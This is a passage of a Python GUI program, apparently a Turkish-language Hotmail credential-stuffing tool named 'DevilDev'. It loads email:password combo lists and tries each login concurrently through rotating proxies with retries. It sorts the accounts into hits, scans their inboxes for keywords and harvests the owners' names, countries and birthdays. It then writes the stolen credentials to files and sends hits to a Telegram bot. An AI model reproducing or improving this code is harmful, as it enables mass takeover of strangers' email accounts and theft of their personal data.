            self.log_box.insert("end", f"[{ts}] {message}\n")
        # Son 3000 satırla sınırla (donma önleme)
        line_count = int(self.log_box.index("end-1c").split(".")[0])
        if line_count > 3000:
            self.log_box.delete("1.0", f"{line_count - 2500}.0")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

        if self.log_to_file.get():
            if not self.rotating_logger:
                self.rotating_logger = RotatingLogger()
            self.rotating_logger.write(f"[{ts}] {message}")

    def set_filter(self, ftype: str):
        self.current_filter = ftype
        for btn in (self.filter_all, self.filter_hit, self.filter_free, self.filter_bad):
            btn.configure(fg_color="#333", hover_color="#555")
        mapping = {"ALL": self.filter_all, "HIT": self.filter_hit,
                   "FREE": self.filter_free, "BAD": self.filter_bad}
        if ftype in mapping:
            mapping[ftype].configure(fg_color=self.primary_color["fg"],
                                     hover_color=self.primary_color["hover"])
        self.update_table()

    def update_table(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

        pattern = None
        regex = self.regex_filter.get().strip()
        if regex:
            try:
                pattern = re.compile(regex, re.IGNORECASE)
            except Exception:
                pass

        search = self.search_query.get().strip().lower()

        for row in self.hit_data:
            typ = row[0]
            email = row[1]
            if self.current_filter != "ALL" and typ != self.current_filter:
                continue
            if pattern and not pattern.search(email):
                continue
            if search and search not in email.lower():
                continue
            self.tree.insert("", "end", values=row[:4], tags=(typ,))

    def add_to_table(self, typ: str, email: str, password: str,
                     match_str: str, name: str = "", country: str = "",
                     birthday: str = "", inbox: str = ""):
        row = (typ, email, password, match_str, name, country, birthday, inbox)
        self.hit_data.insert(0, row)
        # Detay cache'e kaydet
        self._detail_cache[email] = {
            "Name": name, "Country": country, "Birthday": birthday, "Inbox": inbox,
            "Match": match_str, "Type": typ
        }
        self.update_table()

    def on_row_select(self, event):
        """Tabloda satır seçilince detay panelini güncelle"""
        selected = self.tree.selection()
        if not selected:
            return
        values = self.tree.item(selected[0], "values")
        if len(values) < 2:
            return
        email = values[1]
        details = self._detail_cache.get(email, {})

        self.detail_text.configure(state="normal")
        self.detail_text.delete("1.0", "end")
        self.detail_text.insert("end", f"📧 {email}\n")
        self.detail_text.insert("end", f"🔑 {values[2] if len(values) > 2 else ''}\n\n")
        if details:
            self.detail_text.insert("end", f"Tip   : {details.get('Type','')}\n")
            self.detail_text.insert("end", f"Ad    : {details.get('Name','—')}\n")
            self.detail_text.insert("end", f"Ülke  : {details.get('Country','—')}\n")
            self.detail_text.insert("end", f"Doğum : {details.get('Birthday','—')}\n")
            self.detail_text.insert("end", f"Inbox : {details.get('Inbox','—')}\n")
            match = details.get("Match", "")
            if match:
                self.detail_text.insert("end", f"\nKeyword:\n{match}\n")
        self.detail_text.configure(state="disabled")

    def sort_tree(self, col: str):
        items = [(self.tree.set(k, col), k) for k in self.tree.get_children("")]
        items.sort()
        for idx, (_, k) in enumerate(items):
            self.tree.move(k, "", idx)

    def show_tree_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.tree_menu.post(event.x_root, event.y_root)

    def copy_email(self):
        sel = self.tree.selection()
        if sel:
            self.clipboard_clear()
            self.clipboard_append(self.tree.item(sel[0], "values")[1])

    def copy_password(self):
        sel = self.tree.selection()
        if sel:
            self.clipboard_clear()
            self.clipboard_append(self.tree.item(sel[0], "values")[2])

    def copy_row(self):
        sel = self.tree.selection()
        if sel:
            self.clipboard_clear()
            self.clipboard_append(" | ".join(self.tree.item(sel[0], "values")))

    def delete_row(self):
        sel = self.tree.selection()
        if sel:
            vals = tuple(self.tree.item(sel[0], "values"))
            self.hit_data = [r for r in self.hit_data if tuple(r[:4]) != vals[:4]]
            self.tree.delete(sel[0])

    def change_color_theme(self, choice: str):
        self.color_theme = choice
        self.apply_color_theme()
        self.save_config()
        self.start_btn.configure(fg_color=self.primary_color["fg"],
                                 hover_color=self.primary_color["hover"])
        style = ttk.Style()
        style.map("Treeview", background=[("selected", self.primary_color["fg"])])

    # ----------------------------------------------------------
    # Export (CSV / JSON / Excel)
    # ----------------------------------------------------------
    def export_stats(self):
        if not self.hit_data:
            messagebox.showwarning("Uyarı", "Dışa aktarılacak veri yok.")
            return

        filetypes = [("CSV", "*.csv"), ("JSON", "*.json")]
        if HAS_OPENPYXL:
            filetypes.append(("Excel", "*.xlsx"))
        filetypes.append(("Tümü", "*.*"))

        filename = filedialog.asksaveasfilename(
            defaultextension=".csv", filetypes=filetypes
        )
        if not filename:
            return

        try:
            ext = Path(filename).suffix.lower()
            if ext == ".json":
                export_json(self.hit_data, filename)
            elif ext == ".xlsx":
                export_excel(self.hit_data, filename)
            else:
                export_csv(self.hit_data, filename)
            self.log(f"[INFO] Dışa aktarıldı: {filename}", "info")
            messagebox.showinfo("Başarılı", f"Kaydedildi:\n{filename}")
        except Exception as e:
            messagebox.showerror("Hata", str(e))
            self.log(f"[ERR] Export hatası: {e}", "err")

    # ----------------------------------------------------------
    # Combo Düzenleyici
    # ----------------------------------------------------------
    def open_combo_editor(self):
        editor = ctk.CTkToplevel(self)
        editor.title(self.text["combo_editor"])
        editor.geometry("460x520")
        editor.resizable(False, False)
        editor.configure(fg_color="#0d0d0d")

        combo_path = self.combo_file.get().strip()
        combos = []
        if combo_path and Path(combo_path).exists():
            with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        combos.append(line)

        listbox = tk.Listbox(editor, bg="#1a1a1a", fg="#ffffff",
                             selectbackground=self.primary_color["fg"],
                             font=("Consolas", 10))
        listbox.pack(fill="both", expand=True, padx=10, pady=10)
        for c in combos:
            listbox.insert("end", c)

        add_frame = ctk.CTkFrame(editor, fg_color="transparent")
        add_frame.pack(fill="x", padx=10, pady=5)
        entry = ctk.CTkEntry(add_frame, width=280, fg_color="#0d0d0d",
                             border_color=self.primary_color["fg"])
        entry.pack(side="left", padx=5)

        def add_c():
            t = entry.get().strip()
            if t and ":" in t:
                listbox.insert("end", t)
                entry.delete(0, "end")
            else:
                messagebox.showerror("Hata", "Geçerli email:password girin.")

        def rem_c():
            sel = listbox.curselection()
            if sel:
                listbox.delete(sel[0])

        ctk.CTkButton(add_frame, text=self.text["add_combo"], width=70,
                      fg_color=self.primary_color["fg"], hover_color=self.primary_color["hover"],
                      command=add_c).pack(side="left", padx=4)
        ctk.CTkButton(add_frame, text=self.text["remove_combo"], width=70,
                      fg_color="#333", hover_color="#555",
                      command=rem_c).pack(side="left", padx=4)

        def save_c():
            nonlocal combo_path
            if not combo_path:
                combo_path = filedialog.asksaveasfilename(defaultextension=".txt",
                                                          filetypes=[("Text", "*.txt")])
                if not combo_path:
                    return
            with open(combo_path, "w", encoding="utf-8") as f:
                for i in range(listbox.size()):
                    f.write(listbox.get(i) + "\n")
            self.combo_file.set(combo_path)
            editor.destroy()
            self.log(f"[INFO] Combo kaydedildi: {combo_path}", "info")

        ctk.CTkButton(editor, text="💾 Kaydet",
                      fg_color=self.primary_color["fg"],
                      hover_color=self.primary_color["hover"],
                      command=save_c).pack(pady=10)

    # ----------------------------------------------------------
    # Checkpoint
    # ----------------------------------------------------------
    def check_for_checkpoint(self):
        cp = load_checkpoint()
        if cp and self.checkpoint_enabled.get():
            combo_f = cp.get("combo_file", "")
            if combo_f and Path(combo_f).exists():
                ans = messagebox.askyesno(
                    "Checkpoint Bulundu",
                    f"Önceki işlem bulundu.\n"
                    f"Dosya: {combo_f}\n"
                    f"İşlenen: {cp.get('processed_index',0)} / {cp.get('total_combos',0)}\n"
                    f"Devam etmek ister misiniz?"
                )
                if ans:
                    self.combo_file.set(combo_f)
                    self.current_combo_path = combo_f
                    self.hit_data = [tuple(r) for r in cp.get("hit_data", [])]
                    for row in self.hit_data:
                        self.tree.insert("", "end", values=row[:4], tags=(row[0],))
                    self.log("[CHECKPOINT] Kaldığınız yerden devam.", "checkpoint")
                    return
                else:
                    clear_checkpoint()
            else:
                clear_checkpoint()

    # ----------------------------------------------------------
    # GUI güncelleme döngüsü
    # ----------------------------------------------------------
    def update_gui(self):
        # Kuyruktan logları UI'ya aktar
        try:
            while True:
                msg, tag = self.msg_queue.get_nowait()
                self.log(msg, tag)
        except queue.Empty:
            pass

        # Sayaç kartları
        self.box_total.configure(text=str(self.processed_count))
        self.box_hit.configure(text=str(self.total_hits))
        self.box_free.configure(text=str(self.total_free))
        self.box_bad.configure(text=str(self.total_bad))
        self.box_retry.configure(text=str(self.total_retry))
        self.box_dup.configure(text=str(self.total_dup))

        speed = self.stats.get_speed()
        cpm = int(speed * 60)
        self.box_cpm.configure(text=str(cpm))

        sr = (self.total_hits / self.processed_count * 100) if self.processed_count > 0 else 0.0
        self.box_success.configure(text=f"{sr:.1f}%")
        self.lbl_rate.configure(text=f"{self.text['success_rate']} {sr:.1f}%")

        # Proxy kutusu
        if self.proxy_manager.total > 0:
            self.box_proxy.configure(text=f"{self.proxy_manager.active}/{self.proxy_manager.total}")

        # Progress bar
        if self.total_combos > 0:
            pct = min(self.processed_count / self.total_combos, 1.0)
            self.progress.set(pct)
            self.lbl_progress.configure(text=f"{pct*100:.1f}%")

        self.lbl_speed.configure(text=f"{self.text['speed']} {speed:.1f}/s")

        remaining = self.total_combos - self.processed_count
        eta_str = self._format_time(remaining / speed) if speed > 0 and remaining > 0 else "∞"
        self.lbl_eta.configure(text=f"{self.text['eta']} {eta_str}")

        # Grafik güncelle (flush_events ile donma önlenir)
        try:
            if len(self.stats.history) > 1:
                times, h, f, b = zip(*self.stats.history)
                self.line_hit.set_data(times, h)
                self.line_free.set_data(times, f)
                self.line_bad.set_data(times, b)
                self.ax1.relim()
                self.ax1.autoscale_view()
            if len(self.stats.rate_history) > 1:
                rt, rates = zip(*self.stats.rate_history)
                self.line_rate.set_data(rt, rates)
                self.ax2.relim()
                self.ax2.autoscale_view()
            self.canvas.draw_idle()
            self.canvas.flush_events()
        except Exception:
            pass

        # Durum kartı
        status_text = self.text["running"] if self.running else self.text["ready"]
        color = "#00ff66" if self.running else "#00ccff"
        self.box_status.configure(text=status_text, text_color=color)

        self.after(300, self.update_gui)

    @staticmethod
    def _format_time(seconds: float) -> str:
        s = int(seconds)
        if s < 60:
            return f"{s}s"
        elif s < 3600:
            return f"{s//60}m {s%60}s"
        return f"{s//3600}h {(s%3600)//60}m"

    # ----------------------------------------------------------
    # Dosya yükleme
    # ----------------------------------------------------------
    def load_combos(self, file_path: str) -> list[tuple[str, str]]:
        combos = []
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        email, password = line.split(":", 1)
                        combos.append((email.strip(), password.strip()))
        except Exception as e:
            logging.error(f"Combo yükleme hatası: {e}")
        return combos

    def load_keywords(self, file_path: str) -> list[str]:
        keywords = []
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    kw = line.strip()
                    if kw and not kw.startswith("#"):
                        keywords.append(kw)
        except Exception as e:
            logging.error(f"Keyword yükleme hatası: {e}")
        return keywords

    # ----------------------------------------------------------
    # Başlat / Durdur
    # ----------------------------------------------------------
    def start_cracking(self):
        if self.running:
            return

        combo_path = self.combo_file.get().strip()
        keyword_path = self.keyword_file.get().strip()
        if not combo_path or not keyword_path:
            messagebox.showerror("Hata", "Combo ve keyword dosyalarını seçin.")
            return

        proxy_path = self.proxy_file.get().strip()
        if proxy_path and Path(proxy_path).exists():
            self.proxy_manager.load(proxy_path)
            self.lbl_proxy_stats.configure(text=self.proxy_manager.stats_text())

        cp = load_checkpoint() if self.checkpoint_enabled.get() else None
        start_index = 0
        if cp and cp.get("combo_file") == combo_path:
            start_index = cp.get("processed_index", 0)
            self.log(f"[CHECKPOINT] {start_index}. hesaptan devam.", "checkpoint")

        combos = self.load_combos(combo_path)
        keywords = self.load_keywords(keyword_path)

        if not combos:
            messagebox.showerror("Hata", "Geçersiz combo dosyası.")
            return

        if start_index > 0:
            combos = combos[start_index:]
        else:
            clear_checkpoint()
            self.hit_data.clear()
            self._detail_cache.clear()
            self._seen_combos.clear()
            for item in self.tree.get_children():
                self.tree.delete(item)

        self.total_combos = len(combos) + start_index
        self.processed_count = start_index
        self.progress.set(0)
        self.lbl_progress.configure(text="0%")

        if start_index > 0:
            self.total_hits = sum(1 for r in self.hit_data if r[0] == "HIT")
            self.total_free = sum(1 for r in self.hit_data if r[0] == "FREE")
            self.total_bad = sum(1 for r in self.hit_data if r[0] == "BAD")
        else:
            self.total_hits = self.total_free = self.total_bad = self.total_retry = self.total_dup = 0

        token = self.tg_token.get().strip()
        chat = self.tg_chat.get().strip()
        self.notifier = TelegramNotifier(token, chat) if token and chat else None

        self.hit_file = "devildev_hits.txt"
        self.free_file = "devildev_free.txt"
        self.stats = Stats()
        self.running = True
        self.current_combo_path = combo_path

        self.start_btn.configure(state="disabled", fg_color="#444444")
        self.stop_btn.configure(state="normal", fg_color=self.primary_color["fg"])

        self.log(f"[INFO] Başlatıldı. Combo: {self.total_combos} | "
                 f"Concurrent: {self.thread_count.get()} | Retry: {self.max_retry.get()}", "info")

        # Asyncio event loop ayrı thread'de çalıştır
        self._async_loop = asyncio.new_event_loop()
        self._async_thread = threading.Thread(
            target=self._run_async_loop,
            args=(combos, keywords),
            daemon=True
        )
        self._async_thread.start()

    def stop_cracking(self):
        if not self.running:
            return
        self.running = False
        if self._async_loop:
            self._async_loop.call_soon_threadsafe(self._async_loop.stop)
        self.start_btn.configure(state="normal", fg_color=self.primary_color["fg"])
        self.stop_btn.configure(state="disabled", fg_color="#444444")
        self.msg_queue.put(("[INFO] Durduruldu.", "info"))
        if self.checkpoint_enabled.get():
            save_checkpoint(self.processed_count, self.current_combo_path,
                            self.total_combos, self.hit_data)
            self.msg_queue.put(
                (f"[CHECKPOINT] {self.processed_count}/{self.total_combos} kaydedildi.", "checkpoint")
            )

    # ----------------------------------------------------------
    # Async çalışma motoru
    # ----------------------------------------------------------
    def _run_async_loop(self, combos: list, keywords: list):
        asyncio.set_event_loop(self._async_loop)
        try:
            self._async_loop.run_until_complete(
                self._async_main(combos, keywords)
            )
        except Exception as e:
            self.msg_queue.put((f"[ERR] Async loop hatası: {e}", "err"))
        finally:
            self._async_loop.close()
            if self.running:
                self.running = False
                self.after(0, self._on_finish)

    def _on_finish(self):
        self.start_btn.configure(state="normal", fg_color=self.primary_color["fg"])
        self.stop_btn.configure(state="disabled", fg_color="#444444")
        self.log("[INFO] Tüm işlemler tamamlandı.", "info")
        clear_checkpoint()
        if self.sound_enabled.get():
            SOUNDS.get(self.sound_choice.get(), SOUNDS["beep"])()
        if HAS_TOAST:
            try:
                ToastNotifier().show_toast("DevilDev v8.0", "İşlem tamamlandı!", duration=5)
            except Exception:
                pass

    async def _async_main(self, combos: list, keywords: list):
        """Semaphore ile concurrent istek sayısını kontrol et"""
        sem = asyncio.Semaphore(self.thread_count.get())
        lock = asyncio.Lock()

        tasks = [
            self._process_one(email, password, keywords, sem, lock)
            for email, password in combos
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _process_one(self, email: str, password: str,
                            keywords: list, sem: asyncio.Semaphore,
                            lock: asyncio.Lock):
        if not self.running:
            return

        # Duplicate kontrolü
        key = f"{email}:{password}"
        async with lock:
            if key in self._seen_combos:
                self.total_dup += 1
                self.msg_queue.put((f"[DUP] {email}", "dup"))
                return
            self._seen_combos.add(key)

        max_retry = self.max_retry.get()
        status = "BAD"
        captures: dict = {}
        matches: dict = {}

        async with sem:
            for attempt in range(max_retry + 1):
                if not self.running:
                    return
                proxy = self.proxy_manager.get()
                connector = None
                try:
                    if proxy and proxy.startswith("socks") and HAS_SOCKS:
                        connector = ProxyConnector.from_url(proxy, ssl=False)
                    else:
                        connector = aiohttp.TCPConnector(ssl=False, limit=0)

                    jar = aiohttp.CookieJar(unsafe=True)
                    async with aiohttp.ClientSession(connector=connector,
                                                     cookie_jar=jar) as session:
                        checker = HotmailChecker(email, password, keywords, proxy)
                        checker.cookie_jar = jar
                        status, captures, matches = await checker.run(session)

                    if proxy:
                        self.proxy_manager.report_success(proxy)
                    break

                except LoginError as e:
                    err = str(e)
                    status = err if err in ("2FA", "IP BAN") else "BAD"
                    break

                except (aiohttp.ClientError, asyncio.TimeoutError, ConnectionError) as e:
                    if proxy:
                        self.proxy_manager.report_fail(proxy)
                    if attempt < max_retry:
                        self.stats.add("retry")
                        async with lock:
                            self.total_retry += 1
                        self.msg_queue.put((f"[RETRY] {email} (deneme {attempt+1})", "retry"))
                        await asyncio.sleep(random.uniform(1.0, 2.5))
                    else:
                        status = "BAD"
                        logging.warning(f"Max retry aşıldı: {email} — {type(e).__name__}: {e}")

                except Exception as e:
                    status = "BAD"
                    logging.error(f"Beklenmeyen hata ({email}): {type(e).__name__}: {e}")
                    break

                finally:
                    # Connector kapatma garantisi
                    try:
                        if connector and not connector.closed:
                            await connector.close()
                    except Exception:
                        pass

        # Sonucu işle
        await self._handle_result(email, password, status, captures, matches)

    async def _handle_result(self, email: str, password: str,
                              status: str, captures: dict, matches: dict):
        name = captures.get("Name", "")
        country = captures.get("Country", "")
        birthday = captures.get("Birthday", "")
        inbox = captures.get("Inbox", "")

        if status == "HIT":
            self.stats.add("hit")
            match_str = " | ".join(f"{kw}({d['total']})" for kw, d in matches.items())
            self.msg_queue.put((f"[HIT] {email}:{password} → {match_str}", "hit"))
            self.after(0, lambda: self.add_to_table("HIT", email, password,
                                                     match_str, name, country, birthday, inbox))
            self.total_hits += 1
            # Hits dosyasına profil ile yaz
            line = f"{email}:{password} | {match_str}"
            if name:
                line += f" | Name:{name}"
            if country:
                line += f" | Country:{country}"
            if birthday:
                line += f" | Birthday:{birthday}"
            if inbox:
                line += f" | Inbox:{inbox}"
            with open(self.hit_file, "a", encoding="utf-8") as f:
                f.write(line + "\n")
            if self.notifier:
                threading.Thread(
                    target=self.notifier.send_hit,
                    args=(email, password, captures, matches),
                    daemon=True
                ).start()
            if self.sound_enabled.get():
                SOUNDS.get(self.sound_choice.get(), SOUNDS["beep"])()

        elif status == "FREE":
            self.stats.add("free")
            self.msg_queue.put((f"[FREE] {email}:{password}", "free"))
            self.after(0, lambda: self.add_to_table("FREE", email, password,
                                                     "", name, country, birthday, inbox))
            self.total_free += 1
            with open(self.free_file, "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")

        else:
            self.stats.add("bad")
            self.msg_queue.put((f"[{status}] {email}:{password}", "bad"))
            self.after(0, lambda: self.add_to_table(status, email, password, ""))
            self.total_bad += 1

        self.processed_count += 1

        # Checkpoint
        interval = self.checkpoint_interval.get()
        if (self.checkpoint_enabled.get() and interval > 0
                and self.processed_count % interval == 0):
            save_checkpoint(self.processed_count, self.current_combo_path,
                            self.total_combos, self.hit_data)


# ============================================================
# Entry point
# ============================================================
if __name__ == "__main__":
    # Logging ayarı (dosyaya + konsola)
    logging.basicConfig(
        level=logging.WARNING,
        format="%(asctime)s [%(levelname)s] %(message)s",
        handlers=[
            logging.StreamHandler(sys.stdout),
            RotatingFileHandler("devildev_errors.log",
                                maxBytes=2*1024*1024,
                                backupCount=2,
                                encoding="utf-8"),
        ]
    )

    # aiohttp yoksa kullanıcıyı uyar
    if not HAS_AIOHTTP:
        print("UYARI: aiohttp kurulu değil. Kurmak için: pip install aiohttp")
        print("SOCKS5 proxy için: pip install aiohttp-socks")
        sys.exit(1)

    app = DevilDevApp()
    app.mainloop()
